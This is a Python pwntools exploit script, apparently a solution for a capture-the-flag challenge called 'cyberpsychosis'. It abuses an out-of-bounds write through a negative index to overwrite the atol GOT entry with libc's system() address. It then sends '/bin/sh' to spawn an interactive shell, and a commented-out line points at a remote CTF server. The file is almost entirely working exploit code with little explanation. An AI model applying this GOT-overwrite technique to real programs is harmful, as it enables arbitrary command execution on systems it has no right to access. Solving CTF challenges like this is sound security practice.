from pwn import *



context.arch = "amd64"
elf=context.binary=ELF('pwn/cyberpsychosis/cyberpsychosis')

r = process('pwn/cyberpsychosis/cyberpsychosis')
#r = remote('ctf.adl.tw', 10004)
print("got.atol addrs is :%#x"%elf.got.atol)          #atol is at     0x405068
print("implants addrs is :%#x"%elf.symbols.implants)  #implants is at 0x4050e0
#elf.got.atol=elf.symbols.implants-0x78(0d120)


libc_base=0x00007f7fba3a5000#ldd 

r.sendline(b'2')#implant
r.sendline(b'0')# at 0
r.sendline(b'123456789')#name 
r.sendline(b'999999999')#value

r.sendline(b'2')#implant
r.sendline(b'-2')#this writes to the elf.got.atol

sys_addr=libc_base+0x52290

print('system addr:%#x'%sys_addr)
payload=flat([
    b'a'*8,
    sys_addr])
r.sendline(payload)
pause()
payload=flat([b'/bin/sh\0'])
r.sendline(payload)

r.interactive()

